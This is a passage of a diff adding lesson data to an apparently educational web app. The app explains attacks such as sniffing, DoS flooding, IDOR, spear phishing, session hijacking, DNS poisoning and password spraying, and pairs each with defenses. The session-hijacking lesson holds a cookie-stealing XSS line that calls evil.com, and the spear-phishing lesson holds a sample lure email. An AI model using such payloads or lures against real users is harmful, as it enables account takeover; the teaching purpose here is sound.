+<span class="qkw">execFile</span>(<span class="qstr">'ping'</span>, [<span class="qstr">'-c'</span>, <span class="qstr">'4'</span>, <span class="qhi">validatedHost</span>])
+        </div>
+        <div class="callout grn">Validate input: only allow letters, digits, dots and hyphens. Reject anything else before the exec call is even reached.</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 12. NETWORK SNIFFING ──────────────────────────────────────────
+{
+  id:'sniff', capec:'CAPEC-157', title:'Network Sniffing',
+  category:'Network', catColor:'#0891b2', difficulty:1,
+  icon:'📡', tagline:'Capturing unencrypted data as it travels across a network — passwords, cookies, and messages in plain sight.',
+  steps:[
+    { title:'Data Travels as Packets',
+      desc:'Everything you send online is broken into <span class="term" data-tip="Small chunks of data your device sends across a network. Each packet has a header (destination address, type) and a payload (the actual content).">packets</span> that travel through routers, switches, and cables. On an unencrypted connection, anyone along that path can read the contents.',
+      html:`<div class="mitm-scene">
+        <div class="net-row">
+          <div class="net-node"><div class="net-ico act">💻</div><div class="net-lbl">You</div></div>
+          <div class="wire" id="snw1" style="background:var(--fgm)"></div>
+          <div class="net-node"><div class="net-ico" style="border-color:var(--fgm);background:var(--sf2)">📡</div><div class="net-lbl">Network</div></div>
+          <div class="wire" id="snw2" style="background:var(--fgm)"></div>
+          <div class="net-node"><div class="net-ico act">🖥️</div><div class="net-lbl">Server</div></div>
+        </div>
+        <div class="callout org" style="margin-top:8px">HTTP traffic is sent in <strong>plain text</strong>. Your router, ISP, and anyone on the same Wi-Fi network can see every byte.</div>
+      </div>`,
+      init(viz){
+        const w=viz.querySelector('#snw1');
+        if(!w) return;
+        function drop(){
+          const p=document.createElement('div'); p.className='pkt';
+          p.style.cssText='background:var(--fgm);left:0%';
+          w.appendChild(p); kt(requestAnimationFrame(()=>{ p.style.left='100%'; }));
+          kt(setTimeout(()=>p.remove(),1600));
+          kt(setTimeout(drop,2000));
+        }
+        kt(setTimeout(drop,400));
+      }
+    },
+    { title:'Passive Listening',
+      desc:'A <span class="term" data-tip="A network interface set to capture all packets on a segment, not just those addressed to it.">promiscuous-mode</span> network adapter records every packet it sees. On shared networks (public Wi-Fi, older Ethernet hubs) this requires no attack at all — the attacker just listens. Tools like Wireshark make this point-and-click.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="qbox" style="line-height:1.8;font-size:11px">
+<span class="qcmt"># Captured HTTP login — everything visible:</span>
+<span class="qkw">POST</span> /login HTTP/1.1
+Host: insecure-forum.com
+<span class="qinj">username=alice&password=hunter2</span>
+
+<span class="qcmt"># Session cookie captured from subsequent request:</span>
+<span class="qinj">Cookie: PHPSESSID=abc987xyz</span>
+        </div>
+        <div class="info-box">The attacker now has Alice\'s password <em>and</em> her session — they can log in immediately or come back later.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Enforce HTTPS Everywhere',
+      desc:'<span class="term" data-tip="TLS (Transport Layer Security) is the encryption layer behind HTTPS. It creates a private tunnel between your browser and a server so nobody in between can read the traffic.">TLS encryption</span> scrambles packet payloads so a sniffer sees only random bytes. Look for the padlock and <code class="ic">https://</code>. Use <span class="term" data-tip="HSTS preloading tells browsers to always use HTTPS for a domain — and this list is hardcoded into browsers before any attack can happen, so there\'s no initial unencrypted request an attacker could hijack.">HSTS</span> to prevent accidental HTTP downgrades. On public Wi-Fi, use a VPN as an extra layer.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="url-bar"><span class="lock">🔒</span><span style="color:var(--green);font-weight:600">https://</span>bank.example.com/login</div>
+        <div class="qbox" style="line-height:1.8;font-size:11px">
+<span class="qcmt"># What a sniffer sees with TLS:</span>
+<span class="qstr">TLSv1.3 Record Layer: Application Data
+  Encrypted Application Data: a3 f9 2c 08 bb 7d 41...</span>
+        </div>
+        <div class="callout grn">Meaningless cipher text — the plaintext never leaves the encrypted tunnel.</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 13. DENIAL OF SERVICE (FLOODING) ─────────────────────────────
+{
+  id:'dos', capec:'CAPEC-125', title:'Denial of Service — Flooding',
+  category:'Network', catColor:'#0891b2', difficulty:1,
+  icon:'💥', tagline:'Overwhelming a server with more requests than it can handle so legitimate users can\'t get through.',
+  steps:[
+    { title:'Servers Have Limits',
+      desc:'Every server has a finite amount of memory, CPU, and network bandwidth. Under normal load it handles requests in order. Flood it with millions of requests and the queue grows faster than it can be drained — eventually legitimate requests time out or get dropped.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div id="req-q" class="req-queue"></div>
+        <div class="req-stat">
+          <div><strong id="ok-ct" style="color:var(--green)">0</strong>Requests OK</div>
+          <div><strong id="q-ct" style="color:var(--orange)">0</strong>In Queue</div>
+          <div><strong id="drop-ct" style="color:var(--red)">0</strong>Dropped</div>
+        </div>
+      </div>`,
+      init(viz){
+        const q=viz.querySelector('#req-q'), ok=viz.querySelector('#ok-ct'), qc=viz.querySelector('#q-ct'), dc=viz.querySelector('#drop-ct');
+        if(!q) return;
+        let okN=0,qN=0,dropN=0,items=[];
+        const legit=['GET /','POST /login','GET /api/data','GET /style.css'];
+        const flood=['GET / [flood]','GET / [flood]','GET / [flood]'];
+        function addReq(txt,type){
+          if(items.length>9){ const old=items.shift(); old.classList.add('drop'); dropN++; dc.textContent=dropN; }
+          const el=document.createElement('div'); el.className='req-item'+(type==='flood'?' flood':'');
+          el.textContent=txt; q.appendChild(el); items.push(el); qN++; qc.textContent=qN;
+          kt(setTimeout(()=>{ if(el.classList.contains('drop')) return; el.remove(); items=items.filter(x=>x!==el); okN++; ok.textContent=okN; qN=Math.max(0,qN-1); qc.textContent=qN; },type==='flood'?3000:900));
+        }
+        let tick=0;
+        function run(){
+          if(tick<20){
+            addReq(tick<6?legit[tick%4]:flood[tick%3], tick<6?'legit':'flood');
+            tick++; kt(setTimeout(run, tick<6?600:220));
+          }
+        }
+        kt(setTimeout(run,300));
+      }
+    },
+    { title:'Distributed (DDoS)',
+      desc:'A <span class="term" data-tip="A network of infected computers, controlled remotely by an attacker, used to send traffic from thousands of different IPs simultaneously — making it very hard to block.">botnet</span> amplifies the attack. Instead of one source that\'s easy to block, traffic pours in from hundreds of thousands of compromised machines worldwide. The target\'s upstream bandwidth gets saturated before filtering can even help.',
+      html:`<div class="mitm-scene">
+        <div class="net-row" style="justify-content:space-around;flex-wrap:wrap;gap:8px">
+          <div style="display:flex;flex-direction:column;gap:6px">
+            <div class="net-node" style="opacity:.7"><div class="net-ico evil" style="width:38px;height:38px;font-size:14px">🤖</div><div class="net-lbl" style="font-size:10px">Bot #1</div></div>
+            <div class="net-node" style="opacity:.7"><div class="net-ico evil" style="width:38px;height:38px;font-size:14px">🤖</div><div class="net-lbl" style="font-size:10px">Bot #2</div></div>
+            <div class="net-node" style="opacity:.7"><div class="net-ico evil" style="width:38px;height:38px;font-size:14px">🤖</div><div class="net-lbl" style="font-size:10px">Bot #n</div></div>
+          </div>
+          <div class="wire evil" id="ddw" style="max-width:100px"></div>
+          <div class="net-node"><div class="net-ico act" id="srv-ico">🖥️</div><div class="net-lbl">Target</div></div>
+        </div>
+        <div id="ddos-log" style="background:var(--surface);border:1px solid var(--bdr);border-radius:var(--rs);padding:8px;font-family:var(--fm);font-size:11px;margin-top:8px;min-height:44px;line-height:1.8"></div>
+      </div>`,
+      init(viz){
+        const w=viz.querySelector('#ddw'), log=viz.querySelector('#ddos-log'), srv=viz.querySelector('#srv-ico');
+        if(!w||!log) return;
+        const msgs=['🟥 100 req/s — queuing','🟥 800 req/s — degraded','🟥 5,000 req/s — service unavailable'];
+        let i=0;
+        function wave(){
+          if(i>=msgs.length) return;
+          const p=document.createElement('div'); p.className='pkt'; p.style.cssText='background:var(--red);left:0%';
+          w.appendChild(p); kt(requestAnimationFrame(()=>p.style.left='100%'));
+          kt(setTimeout(()=>{ p.remove(); log.innerHTML+=msgs[i]+'<br>'; log.scrollTop=log.scrollHeight;
+            if(srv){ srv.style.background='var(--red)'; kt(setTimeout(()=>srv.style.background='',400)); }
+            i++; kt(setTimeout(wave,1200));
+          },1550));
+        }
+        kt(setTimeout(wave,400));
+      }
+    },
+    { title:'Defense: Rate Limiting & CDNs',
+      desc:'<span class="term" data-tip="Rate limiting caps how many requests a single IP address can make per second. Excess requests are queued or dropped automatically.">Rate limiting</span> caps requests per IP. <span class="term" data-tip="A Content Delivery Network distributes a site across hundreds of servers worldwide, absorbing flood traffic far from the origin server. Cloudflare, Akamai, and AWS Shield are examples.">CDN providers</span> like Cloudflare absorb flood traffic at the network edge before it reaches your server. Modern systems also use <span class="term" data-tip="Checks that detect non-human traffic patterns — like solving a puzzle or analyzing mouse movements — to separate bots from real users.">CAPTCHA challenges</span> and anomaly detection.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ Rate limiting at the edge (e.g. 100 req/s per IP)<br><br>✅ CDN / DDoS scrubbing service absorbs volumetric floods<br><br>✅ Auto-scaling infrastructure handles legitimate traffic spikes<br><br>✅ Monitoring + alerting catches attacks early before they cause outages</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 14. PARAMETER TAMPERING ───────────────────────────────────────
+{
+  id:'paramtamper', capec:'CAPEC-77', title:'Parameter Tampering',
+  category:'Web', catColor:'#2563eb', difficulty:1,
+  icon:'🔧', tagline:'Modifying hidden form fields, cookies, or URL parameters to get unauthorized discounts, access, or privileges.',
+  steps:[
+    { title:'The Server Trusts What You Send',
+      desc:'Web forms often pass values the server shouldn\'t trust — an item price, a user role, a discount code. Developers sometimes make the mistake of storing these in hidden form fields or URL parameters, assuming users won\'t notice or change them.',
+      html:`<div class="sql-scene">
+        <div class="mock-form"><h4>🛒 Checkout</h4>
+          <div class="fld"><label>Item</label><div class="fi">Laptop</div></div>
+          <div class="fld"><label>Hidden: Price</label><div class="fi" style="color:var(--fgm)">price=999.99</div></div>
+          <div class="fld"><label>Hidden: Role</label><div class="fi" style="color:var(--fgm)">role=customer</div></div>
+        </div>
+        <div class="callout org">These "hidden" fields are visible to anyone who opens browser Dev Tools or views source.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Editing Before Sending',
+      desc:'The attacker uses browser developer tools or an <span class="term" data-tip="A tool that sits between the browser and server, letting you inspect and modify every request before it\'s sent — Burp Suite is the most popular.">intercepting proxy</span> to change the values before the form submits. Changing <code class="ic">price=999.99</code> to <code class="ic">price=0.01</code> or <code class="ic">role=customer</code> to <code class="ic">role=admin</code> might work if the server doesn\'t validate server-side.',
+      html:`<div class="sql-scene">
+        <div class="mock-form" style="border-color:var(--red)"><h4>🛒 Checkout (tampered)</h4>
+          <div class="fld"><label>Item</label><div class="fi">Laptop</div></div>
+          <div class="fld"><label>Hidden: Price</label><div class="fi"><span style="text-decoration:line-through;color:var(--fgm)">price=999.99</span> → <span style="color:var(--red)">price=0.01</span></div></div>
+          <div class="fld"><label>Hidden: Role</label><div class="fi"><span style="text-decoration:line-through;color:var(--fgm)">role=customer</span> → <span style="color:var(--red)">role=admin</span></div></div>
+        </div>
+        <div class="callout red">If the server reads the price directly from the POST body without checking inventory prices — the laptop just cost one cent.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Server-Side Authoritative Data',
+      desc:'The server must never trust client-supplied values for anything security-relevant. Prices should come from the database, not the form. Role should come from the session, not a form field. Validate and re-lookup everything server-side.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="qbox" style="line-height:1.8;font-size:11px">
+<span class="qcmt">// ❌ Trusting the client:</span>
+<span class="qinj">price = request.body.price    // attacker controls this</span>
+
+<span class="qcmt">// ✅ Look up from authoritative source:</span>
+<span class="qkw">price</span> = <span class="qhi">db.getPrice(itemId)</span>  <span class="qcmt">// server controls this</span>
+<span class="qkw">role</span>  = <span class="qhi">session.user.role</span>    <span class="qcmt">// set at login, not from form</span>
+        </div>
+        <div class="callout grn">The rule: anything the user <em>could</em> change, they <em>will</em> change. Store trusted values server-side, never in the client.</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 15. INSECURE DIRECT OBJECT REFERENCE (IDOR) ───────────────────
+{
+  id:'idor', capec:'CAPEC-25', title:'Insecure Direct Object Reference',
+  category:'Web', catColor:'#2563eb', difficulty:1,
+  icon:'🔓', tagline:'Changing a number in a URL or request to access another user\'s data when the server doesn\'t check ownership.',
+  steps:[
+    { title:'IDs That Point to Data',
+      desc:'Web apps use IDs — in URLs, form fields, or API calls — to look up specific records. If the app exposes the underlying database ID directly and doesn\'t verify that the requesting user owns that record, changing the number accesses someone else\'s data.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="url-bar"><span class="lock">🔒</span>app.example.com/invoice?id=<span style="color:var(--teal);font-weight:700">1042</span></div>
+        <div class="info-box">You\'re logged in and this is your invoice #1042. But what is invoice #1041? Or #1050? The app hands you the ID directly — no secret, no ownership check.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Enumerating Other Users\' Records',
+      desc:'The attacker simply changes the ID in the URL and requests another record. If the server returns it without checking <em>who is logged in</em> versus <em>who owns the record</em>, every user\'s data is exposed.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="url-bar" style="border-color:var(--teal)"><span class="lock">🔒</span>app.example.com/invoice?id=<span style="color:var(--teal);font-weight:700">1042</span> → Your invoice ✓</div>
+        <div class="url-bar" style="border-color:var(--red)"><span class="lock">🔒</span>app.example.com/invoice?id=<span style="color:var(--red);font-weight:700">1041</span> → Neighbor\'s invoice 🔴</div>
+        <div class="url-bar" style="border-color:var(--red)"><span class="lock">🔒</span>app.example.com/invoice?id=<span style="color:var(--red);font-weight:700">1000</span> → Stranger\'s invoice 🔴</div>
+        <div class="callout red">Sequential or predictable IDs make enumeration trivial. Attacker scripts can download thousands of records automatically.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Authorize Every Request',
+      desc:'The fix is an <span class="term" data-tip="Checking not just whether you\'re logged in (authentication), but whether you have permission to access this specific resource (authorization). These are two separate checks.">authorization check</span> on every data access: does the currently logged-in user own (or have permission to view) this object? Use non-sequential IDs like <span class="term" data-tip="A Universally Unique Identifier — a long random string like 550e8400-e29b-41d4-a716-446655440000. Harder to guess than sequential integers, but secrecy is not a substitute for proper authorization checks.">UUIDs</span> to reduce guessability, but never rely on secrecy alone.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="qbox" style="line-height:1.8;font-size:11px">
+<span class="qcmt">// ❌ Vulnerable — fetches by ID, no ownership check:</span>
+<span class="qinj">invoice = db.find(request.params.id)</span>
+
+<span class="qcmt">// ✅ Safe — ties the lookup to the logged-in user:</span>
+<span class="qkw">invoice</span> = db.find(<span class="qstr">{id: request.params.id,</span>
+                    <span class="qhi">userId: session.userId}</span>)
+<span class="qkw">if</span> (!invoice) <span class="qkw">return</span> <span class="qstr">403 Forbidden</span>
+        </div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 16. SPEAR PHISHING ────────────────────────────────────────────
+{
+  id:'spear', capec:'CAPEC-163', title:'Spear Phishing',
+  category:'Social Eng.', catColor:'#d97706', difficulty:2,
+  icon:'🎯', tagline:'A hyper-personalised phishing attack crafted using research about the specific target — far more convincing than mass campaigns.',
+  steps:[
+    { title:'Research the Target First',
+      desc:'Unlike generic phishing, spear phishing starts with <span class="term" data-tip="Open Source Intelligence — gathering information about a person or organization from publicly available sources: LinkedIn, Twitter, company websites, press releases, and conference talks.">OSINT</span>. The attacker learns the target\'s name, employer, job title, direct manager, current projects, and colleagues — all from public sources.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="osint-row">
+          <div class="osint-src"><div class="os-lbl">LinkedIn</div>Alice Chen — Sr. Developer at AcmeCorp. Reports to: Bob Martinez (CTO)</div>
+          <div class="osint-src"><div class="os-lbl">Company Blog</div>"AcmeCorp launches Project Phoenix — Q4 launch target confirmed"</div>
+        </div>
+        <div class="osint-row">
+          <div class="osint-src"><div class="os-lbl">Twitter</div>"So excited to be presenting at DevConf next Tuesday with the Phoenix team!"</div>
+          <div class="osint-src"><div class="os-lbl">Breachdb</div>alice.chen@acmecorp.com — email confirmed from prior leak</div>
+        </div>
+      </div>`,
+      init(){}
+    },
+    { title:'A Believable, Personalized Lure',
+      desc:'Armed with real details, the attacker crafts a targeted message that references Alice\'s actual project and manager. The realism makes Alice far more likely to trust it — this doesn\'t look like a generic scam.',
+      html:`<div class="phish-scene">
+        <div class="eml-card">
+          <div class="eml-bar"><div class="eml-dots"><div class="eml-dot" style="background:#ff5f56"></div><div class="eml-dot" style="background:#febc2e"></div><div class="eml-dot" style="background:#28c840"></div></div><span>Mail</span></div>
+          <div class="eml-flds">
+            <div class="ef"><span class="ef-l">From:</span><span class="flag red" data-tip="Domain is b0b-martinez.com — not acmecorp.com">bob-martinez@b0b-martinez.com</span></div>
+            <div class="ef"><span class="ef-l">To:</span> alice.chen@acmecorp.com</div>
+            <div class="ef"><span class="ef-l">Subject:</span> <strong>Project Phoenix — urgent code review needed</strong></div>
+          </div>
+          <div class="eml-body" style="font-size:12px">Hi Alice,<br><br>I need you to review the updated auth module before your DevConf presentation Tuesday. I\'ve shared the file here — please check the credentials section urgently.<br><br><span class="eml-link bad">https://acmecorp-phoenix.com/auth-review.docx</span><br><br>— Bob</div>
+        </div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Verify Out-of-Band',
+      desc:'When a message creates urgency and asks you to click a link or share credentials — especially from a "known" person — verify it through a completely different channel. Call Bob on his known extension. Don\'t reply to the email or click any link first. Check the actual sender domain carefully.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ Verify unexpected requests <strong>out-of-band</strong> — phone, Slack, in person — never via the channel the attacker initiated<br><br>✅ Hover over links before clicking. <code>b0b-martinez.com</code> ≠ <code>acmecorp.com</code><br><br>✅ Organization-wide security training with simulated spear phishing significantly reduces click rates</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 17. SESSION HIJACKING ─────────────────────────────────────────
+{
+  id:'hijack', capec:'CAPEC-60', title:'Session Hijacking',
+  category:'Credential', catColor:'#d97706', difficulty:2,
+  icon:'🍪', tagline:'Stealing a valid session cookie to impersonate an already-logged-in user without needing their password.',
+  steps:[
+    { title:'Sessions Are How Websites Remember You',
+      desc:'After you log in, the server creates a <span class="term" data-tip="A long random string the server generates after login and stores in your browser as a cookie. Every request you make sends this token so the server knows who you are without re-asking for your password.">session token</span> and sends it to your browser as a cookie. Your browser sends it back automatically with every page request. Whoever holds the token is treated as you.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div class="qbox" style="font-size:11px;line-height:1.9">
+<span class="qcmt"># Server sends after successful login:</span>
+<span class="qkw">Set-Cookie:</span> <span class="qhi">session=eyJhbGciOi...long...random</span>;
+            HttpOnly; Secure; SameSite=Lax
+
+<span class="qcmt"># Browser sends with every page load:</span>
+<span class="qkw">Cookie:</span> <span class="qhi">session=eyJhbGciOi...long...random</span>
+        </div>
+        <div class="info-box">The session token <em>is</em> the login. Steal the token, steal the session — no password needed.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'How Cookies Get Stolen',
+      desc:'Session cookies can be stolen several ways: through <span class="term" data-tip="Cross-Site Scripting — injecting malicious JavaScript into a page, which can then read document.cookie and send it to the attacker.">XSS</span> that reads <code class="ic">document.cookie</code>, through <span class="term" data-tip="Capturing unencrypted HTTP traffic on a network — the cookie travels in plain text.">network sniffing</span> if the connection is HTTP, or by compromising the victim\'s device.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt">// XSS payload steals cookie:</span>
+<span class="qinj">fetch('https://evil.com/steal?c=' + document.cookie)</span>
+
+<span class="qcmt">// Attacker receives:</span>
+<span class="qhi">session=eyJhbGciOi...long...random</span>
+        </div>
+        <div class="callout red">With the session token, the attacker replays it in their own browser. The server sees a valid session and grants full access.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: Cookie Security Flags',
+      desc:'Three cookie attributes dramatically reduce theft risk. <span class="term" data-tip="HttpOnly prevents JavaScript from reading the cookie via document.cookie — so XSS can\'t steal it.">HttpOnly</span> hides the cookie from JavaScript. <span class="term" data-tip="Secure tells the browser to only send the cookie over HTTPS connections — never over HTTP.">Secure</span> prevents it from travelling over plain HTTP. <span class="term" data-tip="A cookie attribute that tells the browser to only send the cookie when navigating from the same site. SameSite=Strict prevents the cookie from being sent in cross-site form submissions at all.">SameSite</span> restricts cross-site sending. Short session timeouts also limit the window of exposure.',
+      html:`<div class="vpad">
+        <div class="qbox" style="font-size:11px;line-height:1.9">
+<span class="qkw">Set-Cookie:</span> session=...; <span class="qhi">HttpOnly</span>; <span class="qhi">Secure</span>; <span class="qhi">SameSite=Strict</span>
+</div>
+        <div class="callout grn">HttpOnly → XSS can\'t read it<br>Secure → not sent over HTTP<br>SameSite=Strict → not sent on cross-site requests<br>Short TTL → stolen tokens expire quickly</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 18. DNS CACHE POISONING ───────────────────────────────────────
+{
+  id:'dnspois', capec:'CAPEC-142', title:'DNS Cache Poisoning',
+  category:'Network', catColor:'#0891b2', difficulty:3,
+  icon:'☠️', tagline:'Injecting a false DNS answer into a resolver\'s cache so victims are silently redirected to a malicious server.',
+  steps:[
+    { title:'How DNS Resolves Names',
+      desc:'When you type <code class="ic">bank.example.com</code>, your computer asks a <span class="term" data-tip="A DNS resolver is an intermediary server — usually run by your ISP or a public service like 8.8.8.8 — that looks up domain names and caches the answers so it doesn\'t have to ask again for a while.">recursive resolver</span> which asks the <span class="term" data-tip="The authoritative name server holds the official DNS records for a domain — the final word on what IP address a name maps to.">authoritative name server</span> for the IP address. The resolver caches the answer to speed up future requests.',
+      html:`<div class="dns-scene">
+        <div class="dns-chain">
+          <div class="dns-hop"><div class="dh-ico">💻</div><div class="dh-lbl">You</div></div>
+          <div class="dns-arr">→</div>
+          <div class="dns-hop"><div class="dh-ico">🔄</div><div class="dh-lbl">Resolver</div></div>
+          <div class="dns-arr">→</div>
+          <div class="dns-hop"><div class="dh-ico">📋</div><div class="dh-lbl">Auth NS</div></div>
+        </div>
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qkw">Query:</span>  What is the IP for bank.example.com?
+<span class="qkw">Answer:</span> <span class="qhi">93.184.216.34</span>  (TTL: 300s)
+<span class="qcmt">Resolver caches this answer for 5 minutes</span>
+        </div>
+      </div>`,
+      init(){}
+    },
+    { title:'Racing to Poison the Cache',
+      desc:'The resolver sends a query with a <span class="term" data-tip="A 16-bit number in the DNS query that the resolver expects the answer to match. Classic poisoning guesses this number — an attacker who wins the race before the real answer arrives can inject a fake one.">transaction ID</span>. If an attacker floods the resolver with forged responses using random IDs, they may get lucky before the real answer arrives. The forged record then sits in the cache and misdirects everyone who uses that resolver.',
+      html:`<div class="mitm-scene">
+        <div class="net-row">
+          <div class="net-node"><div class="net-ico act">🔄</div><div class="net-lbl">Resolver</div></div>
+          <div class="wire" id="dw1" style="background:var(--teal)"></div>
+          <div class="net-node"><div class="net-ico act">📋</div><div class="net-lbl">Real NS</div></div>
+        </div>
+        <div style="text-align:center;font-size:11px;color:var(--fgm);margin:4px 0">Meanwhile, from below…</div>
+        <div class="net-row">
+          <div class="net-node"><div class="net-ico evil">🦹</div><div class="net-lbl">Attacker</div></div>
+          <div class="wire evil" id="dw2"></div>
+          <div class="net-node"><div class="net-ico act">🔄</div><div class="net-lbl">Resolver</div></div>
+        </div>
+        <div id="dns-log" style="background:var(--surface);border:1px solid var(--bdr);border-radius:var(--rs);padding:8px;font-family:var(--fm);font-size:11px;margin-top:8px;min-height:44px;line-height:1.8"></div>
+      </div>`,
+      init(viz){
+        const w2=viz.querySelector('#dw2'),log=viz.querySelector('#dns-log');
+        if(!w2||!log) return;
+        const steps=[
+          'Resolver asks: IP for bank.example.com? (txid=31337)',
+          '🦹 Attacker floods resolver with 65536 fake responses…',
+          '🦹 Forged answer accepted! bank.example.com → 10.0.0.99 (attacker\'s server)',
+          '☠️ Cache poisoned — all users asking for bank get the fake IP for 300s',
+        ];
+        let i=0;
+        function tick(){
+          if(i>=steps.length) return;
+          if(i===1){
+            const p=document.createElement('div'); p.className='pkt'; p.style.cssText='background:var(--red);left:0%';
+            w2.appendChild(p); kt(requestAnimationFrame(()=>p.style.left='100%'));
+            kt(setTimeout(()=>p.remove(),1550));
+          }
+          log.innerHTML+=`<span style="color:${i>1?'var(--red)':'var(--fgm)'}">${steps[i]}</span><br>`;
+          log.scrollTop=log.scrollHeight; i++;
+          kt(setTimeout(tick,1600));
+        }
+        kt(setTimeout(tick,300));
+      }
+    },
+    { title:'Defense: DNSSEC & Encrypted DNS',
+      desc:'<span class="term" data-tip="DNS Security Extensions — cryptographic signatures on DNS records. A resolver can verify the answer came from the real authoritative server, not a forged packet.">DNSSEC</span> adds digital signatures to DNS records, making forged answers detectable. <span class="term" data-tip="DNS over HTTPS (DoH) and DNS over TLS (DoT) encrypt the DNS query so nobody on the network can inject fake responses at all.">DNS over HTTPS / TLS</span> encrypts queries end-to-end. Randomising source ports and transaction IDs (as modern resolvers do) also raises the guessing bar enormously.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ Deploy DNSSEC on your domain — sign your records<br><br>✅ Configure clients to use DoH or DoT resolvers (e.g. 1.1.1.1, 8.8.8.8 with TLS)<br><br>✅ Modern resolvers randomise both source port and txid — makes brute-forcing impractical</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 19. PASSWORD SPRAYING ─────────────────────────────────────────
+{
+  id:'spray', capec:'CAPEC-560', title:'Password Spraying',
+  category:'Credential', catColor:'#d97706', difficulty:2,
+  icon:'💧', tagline:'Trying one very common password against many accounts — slow enough to avoid lockouts, but effective at scale.',
+  steps:[
+    { title:'Classic Brute Force Has a Problem',
+      desc:'Traditional <span class="term" data-tip="Brute force tries every possible password combination against one account — eventually triggering a lockout after too many failures.">brute force</span> triggers account lockouts after a few failed attempts. Password spraying inverts the attack: instead of trying many passwords on one account, try <em>one very common password</em> across <em>many accounts</em>. Each account only sees one attempt — no lockout.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:10px">
+        <div style="display:flex;gap:10px">
+          <div style="flex:1;border:1.5px solid var(--red);border-radius:var(--rs);padding:10px;background:var(--red-s)">
+            <div style="font-weight:700;font-size:11px;color:var(--red);margin-bottom:6px">❌ Brute Force — triggers lockout</div>
+            <div style="font-family:var(--fm);font-size:10px;line-height:1.9;color:var(--fg2)">alice@corp.com: pass1 ✗<br>alice@corp.com: pass2 ✗<br>alice@corp.com: pass3 ✗<br><span style="color:var(--red)">alice@corp.com: LOCKED 🔒</span></div>
+          </div>
+          <div style="flex:1;border:1.5px solid var(--orange);border-radius:var(--rs);padding:10px;background:var(--orange-s)">
+            <div style="font-weight:700;font-size:11px;color:var(--orange);margin-bottom:6px">⚠️ Spraying — stays under radar</div>
+            <div style="font-family:var(--fm);font-size:10px;line-height:1.9;color:var(--fg2)">alice@corp.com: Spring2024! ✗<br>bob@corp.com: Spring2024! ✗<br>carol@corp.com: Spring2024! ✓<br><span style="color:var(--green)">carol — account accessed!</span></div>
+          </div>
+        </div>
+        <div class="info-box">Spraying is especially effective against corporate accounts — companies often force password resets quarterly, and users predictably choose <code>Season+Year+!</code></div>
+      </div>`,
+      init(){}
+    },
+    { title:'Finding Usernames is Easy',
+      desc:'Corporate email formats are predictable (<code class="ic">firstname.lastname@company.com</code>). LinkedIn, company websites, and email headers reveal real addresses. The attacker builds a list of valid usernames before the spray begins.',
+      html:`<div class="vpad" style="display:flex;flex-direction:column;gap:8px">
+        <div class="qbox" style="font-size:11px;line-height:1.8">
+<span class="qcmt"># Target list assembled from LinkedIn:</span>
+alice.chen@acmecorp.com
+bob.martinez@acmecorp.com
+carol.white@acmecorp.com
+dave.kim@acmecorp.com
+<span class="qcmt">…240 more addresses…</span>
+
+<span class="qcmt"># Try one password — wait 30 min — try the next:</span>
+<span class="qkw">spray</span>(<span class="qstr">"Spring2024!"</span>, targets, wait=<span class="qhi">1800s</span>)
+        </div>
+        <div class="callout org">Waiting between attempts prevents triggering rate-limit alerts. A slow spray across 10,000 accounts might take days but stay completely silent.</div>
+      </div>`,
+      init(){}
+    },
+    { title:'Defense: MFA and Smart Lockout Policies',
+      desc:'<span class="term" data-tip="MFA requires a second proof beyond a password — like a code sent to your phone. Even if Mallory captures your password, she still can\'t log in without your second factor.">MFA</span> is the most effective defense — even a correct spray guess is useless without the second factor. Smart lockout policies that lock based on <em>total failed attempts across accounts</em> (not just per account) can detect spraying patterns. Monitor for impossible travel and off-hours logins.',
+      html:`<div class="vpad">
+        <div class="callout grn">✅ MFA on every account — makes correct passwords insufficient<br><br>✅ Organisation-wide "spray detection" — alert if many accounts see one failure in a short window<br><br>✅ Educate users: avoid predictable patterns like <code>Season+Year+!</code> — use a password manager</div>
+      </div>`,
+      init(){}
+    },
+  ]
+},
+
+// ── 20. SENSITIVE DATA IN SOURCE ──────────────────────────────────
+{
+  id:'srcleaks', capec:'CAPEC-37', title:'Sensitive Data Exposure',
+  category:'Web', catColor:'#2563eb', difficulty:1,
+  icon:'🔑', tagline:'Finding hardcoded API keys, passwords, and secrets accidentally left in source code, comments, or git history.',
+  steps:[
+    { title:'Secrets Get Committed by Mistake',
+      desc:'Developers often hard-code credentials during testing — a database password, an API key, an admin token — intending to remove them later. They forget, commit the file, and push to a public repository. Once on GitHub, the secret is immediately indexed by search engines and automated scanners.',
